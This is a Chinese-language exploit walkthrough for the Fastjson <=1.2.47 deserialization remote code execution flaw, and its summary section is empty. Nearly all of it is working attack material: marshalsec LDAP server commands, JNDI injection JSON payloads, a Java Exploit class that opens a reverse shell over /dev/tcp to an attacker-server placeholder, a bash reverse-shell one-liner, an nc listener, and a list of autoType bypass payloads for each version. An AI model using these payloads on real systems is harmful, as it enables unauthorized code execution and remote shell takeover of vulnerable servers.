Fastjson \<=1.2.47 远程代码执行漏洞
===================================

一、漏洞简介
------------

二、漏洞影响
------------

Fastjson \< 1.2.47

三、复现过程
------------

**https://github.com/ianxtianxt/fastjson-1.2.47-RCE-1**

-   执行：

```{=html}
<!-- -->
```
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://IPvps/#Exploit

1.png

-   修改反弹ip和端口：

```{=html}
<!-- -->
```
    vim Exploit.java

-   编译生成class：//`需要使用jdk1.8，否则会报错`

```{=html}
<!-- -->
```
    javac Exploit.java

-   开启http服务：

```{=html}
<!-- -->
```
    python3 -m http.server 80 或者 python -m SimpleHTTPServer 80

-   payload:

```{=html}
<!-- -->
```
    {"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ip:1389/Exploit","autoCommit":true}}}

-   开启nc监听反弹：

```{=html}
<!-- -->
```
    nc -lvvp 8888

### 反弹shell poc补充

#### **java反弹shell，无法直接使用bash -i \>& /dev/tcp/攻击服务器ip/8888 0\>&1**

    import java.io.BufferedReader;
    import java.io.InputStream;
    import java.io.InputStreamReader;

    public class Exploit{
        public Exploit() throws Exception {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/攻击服务器ip/888;cat <&5 | while read line; do $line 2>&5 >&5; done"});
            InputStream is = p.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));

            String line;
            while((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            p.waitFor();
            is.close();
            reader.close();
            p.destroy();
        }

        public static void main(String[] args) throws Exception {
        }
    }

### 补充

**https://github.com/ianxtianxt/Fastjson-1.2.47-rce**

    1.2.24
    {"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":true}}

    未知版本(1.2.24-41之间)
    {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}

    1.2.41
    {"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}

    1.2.42
    {"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true};

    1.2.43
    {"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true]}

    1.2.45
    {"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://localhost:1099/Exploit"}}

    1.2.47
    {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}}}
